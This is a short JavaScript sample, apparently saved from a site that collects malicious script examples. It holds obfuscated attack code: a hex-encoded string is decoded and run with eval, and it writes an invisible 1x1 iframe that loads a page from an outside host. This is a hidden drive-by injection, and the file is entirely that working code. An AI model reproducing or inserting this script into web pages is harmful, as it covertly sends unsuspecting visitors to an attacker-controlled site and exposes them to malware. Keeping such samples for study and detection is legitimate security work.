// Retrieved from http://aw-snap.info/articles/js-examples.php, 2014-12-09
var t="";
var arr="646f63756d656e742e777269746528273c696672616d65207372633d22687474703a2f2f766e62757974612e636f2e62652f666f72756d2e7068703f74703d36373565616665633433316231663732222077696474683d223122206865696768743d223122206672616d65626f726465723d2230223e3c2f696672616d653e2729";for(i=0;i<arr.length;i+=2)t+=String.fromCharCode(parseInt(arr[i]+arr[i+1],16));eval(t);